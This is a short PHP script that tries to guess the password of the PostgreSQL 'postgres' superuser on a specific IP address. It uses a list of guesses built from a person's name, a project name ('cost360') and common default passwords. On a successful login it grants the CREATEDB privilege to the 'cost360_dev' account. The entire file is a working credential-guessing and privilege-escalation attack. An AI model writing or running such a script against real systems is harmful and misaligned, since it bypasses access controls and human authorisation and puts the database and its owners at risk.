<?php
$host = '100.102.117.42';
$port = 5432;
$pwds = [
    'krish', 'Krish', 'krishneve', 'KrishNeve', 'krish@123', 'Krish@123', 'krish123', 'Krish123', 
    'krishneve@123', 'KrishNeve@123', 'cost360', 'Cost360', 'Cost360@123', 'cost360@123',
    'postgres', 'Postgres', 'Postgres@123', 'postgres@123', 'postgres123',
    'root', 'root@123', 'admin', 'admin@123', 'password', '123456', '12345678', '1234'
];

foreach ($pwds as $pwd) {
    try {
        $pdo = new PDO("pgsql:host={$host};port={$port};dbname=postgres;connect_timeout=1", "postgres", $pwd, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        echo "SUCCESS! Connected as postgres with password: '$pwd'\n";
        $pdo->exec("ALTER USER cost360_dev CREATEDB;");
        echo "Successfully granted CREATEDB to cost360_dev on $host!\n";
        exit(0);
    } catch (Throwable $e) {
        // try next
    }
}
echo "None of the tried passwords worked for postgres superuser.\n";
